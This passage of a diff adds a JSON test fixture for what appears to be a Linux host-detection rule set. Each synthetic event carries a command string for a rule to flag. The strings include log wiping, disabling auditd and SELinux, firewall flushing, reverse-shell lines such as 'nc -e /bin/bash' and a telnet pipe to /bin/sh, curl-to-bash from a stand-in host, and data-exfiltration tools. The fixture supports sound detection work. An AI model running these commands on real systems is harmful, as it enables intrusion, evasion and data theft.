+    }
+  },
+  {
+    "rule_id": "SATSUMA-LNX-DISC-002",
+    "event": {
+      "id": "audit-71",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "wget exploit",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-LNX-DISC-003",
+    "event": {
+      "id": "audit-72",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "gcc -o exploit",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-LNX-EXFIL-001",
+    "event": {
+      "id": "audit-73",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "nc -e",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EVAS-001",
+    "event": {
+      "id": "audit-74",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "rm -rf /var/log",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EVAS-002",
+    "event": {
+      "id": "audit-75",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "systemctl stop auditd",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EVAS-003",
+    "event": {
+      "id": "audit-76",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "setenforce 0",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EVAS-004",
+    "event": {
+      "id": "audit-77",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "aa-complain",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EVAS-005",
+    "event": {
+      "id": "audit-78",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "iptables -F",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EVAS-006",
+    "event": {
+      "id": "audit-79",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "firewall-cmd --panic-off",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EVAS-007",
+    "event": {
+      "id": "audit-80",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "timedatectl set-time",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EVAS-008",
+    "event": {
+      "id": "audit-81",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "touch -t",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EVAS-009",
+    "event": {
+      "id": "audit-82",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "chattr -i",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EVAS-010",
+    "event": {
+      "id": "audit-83",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host",
+      "env": "LD_PRELOAD=fixture"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EVAS-011",
+    "event": {
+      "id": "audit-84",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host",
+      "env": "LD_LIBRARY_PATH=fixture"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EVAS-012",
+    "event": {
+      "id": "audit-85",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "rkhunter",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EVAS-013",
+    "event": {
+      "id": "audit-86",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "semodule -i",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EVAS-014",
+    "event": {
+      "id": "audit-87",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "rmmod",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EVAS-015",
+    "event": {
+      "id": "audit-88",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "sysctl -w",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EVAS-016",
+    "event": {
+      "id": "audit-89",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "echo 1 > /proc/sys/kernel/tainted",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EVAS-017",
+    "event": {
+      "id": "audit-90",
+      "timestamp": 1793435795,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "history -c ",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EVAS-018",
+    "event": {
+      "id": "audit-91",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "rm /var/log/wtmp",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EVAS-019",
+    "event": {
+      "id": "audit-92",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "mount -o bind /dev/null /proc/",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EVAS-020",
+    "event": {
+      "id": "audit-93",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "shred -u",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-DEV-001",
+    "event": {
+      "id": "audit-94",
+      "timestamp": 1793435796,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "operation": "read",
+      "file_path": "/dev/mem"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-DEV-002",
+    "event": {
+      "id": "audit-95",
+      "timestamp": 1793435796,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "operation": "read",
+      "file_path": "/dev/input/eventfixture"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-DEV-003",
+    "event": {
+      "id": "audit-96",
+      "timestamp": 1793435796,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "operation": "write",
+      "file_path": "/dev/sdafixture"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-DEV-004",
+    "event": {
+      "id": "audit-97",
+      "timestamp": 1793435796,
+      "source": "device_inventory",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "sensitive_device_world_access",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-DISC-001",
+    "event": {
+      "id": "audit-98",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "uname -a",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-DISC-002",
+    "event": {
+      "id": "audit-99",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "ip address show",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-DISC-003",
+    "event": {
+      "id": "audit-100",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "cat /etc/passwd",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-DISC-004",
+    "event": {
+      "id": "audit-101",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "ps aux",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-DISC-005",
+    "event": {
+      "id": "audit-102",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "find / -name",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-DISC-006",
+    "event": {
+      "id": "audit-103",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "systemctl list-units",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXEC-001",
+    "event": {
+      "id": "audit-104",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "bash-i/dev/tcp/",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXEC-002",
+    "event": {
+      "id": "audit-105",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "python3 -c 'import socket; print(1)'",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXEC-003",
+    "event": {
+      "id": "audit-106",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "perl -MIO::Socket",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXEC-004",
+    "event": {
+      "id": "audit-107",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "ruby -rsocket -e",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXEC-005",
+    "event": {
+      "id": "audit-108",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "php -r fsockopen();",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXEC-006",
+    "event": {
+      "id": "audit-109",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "socat/bin/shTCP",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXEC-007",
+    "event": {
+      "id": "audit-110",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "nc -e /bin/bash",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXEC-008",
+    "event": {
+      "id": "audit-111",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "base64 -d | bash",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXEC-009",
+    "event": {
+      "id": "audit-112",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "curl https://example.invalid/script | bash",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXEC-010",
+    "event": {
+      "id": "audit-113",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "eval ",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXEC-011",
+    "event": {
+      "id": "audit-114",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "xterm -display",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXEC-012",
+    "event": {
+      "id": "audit-115",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "awk/inet/tcp/",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXEC-013",
+    "event": {
+      "id": "audit-116",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "telnet 203.0.113.9 4444 | /bin/sh",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXEC-014",
+    "event": {
+      "id": "audit-117",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "nmap --script",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXEC-015",
+    "event": {
+      "id": "audit-118",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "msfconsole",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXFIL-001",
+    "event": {
+      "id": "audit-119",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "dig +short",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXFIL-002",
+    "event": {
+      "id": "audit-120",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "curl -X POST -d @",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXFIL-003",
+    "event": {
+      "id": "audit-121",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "ftp -u",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXFIL-004",
+    "event": {
+      "id": "audit-122",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "scp /etc",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXFIL-005",
+    "event": {
+      "id": "audit-123",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "rsync -av /etc",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXFIL-006",
+    "event": {
+      "id": "audit-124",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "nc -w",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXFIL-007",
+    "event": {
+      "id": "audit-125",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "ping -p",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXFIL-008",
+    "event": {
+      "id": "audit-126",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "base64 /etc",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXFIL-009",
+    "event": {
+      "id": "audit-127",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "tar x | curl",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXFIL-010",
+    "event": {
+      "id": "audit-128",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "ssh -R",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXFIL-011",
+    "event": {
+      "id": "audit-129",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "socat - TCP",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXFIL-012",
+    "event": {
+      "id": "audit-130",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "torsocks",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXFIL-013",
+    "event": {
+      "id": "audit-131",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "cadaver",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXFIL-014",
+    "event": {
+      "id": "audit-132",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "smbclient",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXFIL-015",
+    "event": {
+      "id": "audit-133",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "mount -t nfs",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXFIL-016",
+    "event": {
+      "id": "audit-134",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "git clone",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXFIL-017",
+    "event": {
+      "id": "audit-135",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "docker save",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXFIL-018",
+    "event": {
+      "id": "audit-136",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "kubectl cp",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXFIL-019",
+    "event": {
+      "id": "audit-137",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "sendmail",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXFIL-020",
+    "event": {
+      "id": "audit-138",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "pastebinit",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-IMP-001",
+    "event": {
+      "id": "audit-139",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "openssl enc",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-IMP-002",
+    "event": {
+      "id": "audit-140",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "dd if=/dev/zero",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-IMP-003",
+    "event": {
+      "id": "audit-141",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "curl -T",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-IMP-004",
+    "event": {
+      "id": "audit-142",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "service x stop ",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-IMP-005",
+    "event": {
